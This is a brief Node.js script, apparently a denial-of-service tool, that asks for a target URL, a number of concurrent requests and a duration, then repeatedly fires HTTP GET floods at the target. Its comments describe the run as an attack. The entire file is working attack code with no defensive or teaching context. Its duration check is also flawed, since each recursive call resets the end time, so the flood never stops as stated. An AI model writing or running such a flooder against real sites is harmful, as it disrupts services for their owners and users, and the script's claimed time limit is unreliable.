const http = require('http');
const url = require('url');

// Function to send concurrent requests
function sendRequests(targetUrl, numRequests, duration) {
  const startTime = Date.now();
  const endTime = startTime + duration * 1000; // Convert duration to milliseconds

  for (let i = 0; i < numRequests; i++) {
    const request = http.get(targetUrl);
    request.on('error', (err) => {
      console.error(`Error: ${err.message}`);
    });
  }

  // Recursively send requests until the specified duration is reached
  if (Date.now() < endTime) {
    setTimeout(() => sendRequests(targetUrl, numRequests, duration), 1000);
  }
}

// Prompt the user for input
const readline = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
});

readline.question('Enter the target URL: ', (targetUrl) => {
  readline.question('Enter the number of concurrent requests: ', (numRequests) => {
    readline.question('Enter the duration of the attack in seconds: ', (duration) => {
      numRequests = parseInt(numRequests);
      duration = parseInt(duration);

      // Start the attack
      sendRequests(targetUrl, numRequests, duration);

      readline.close();
    });
  });
});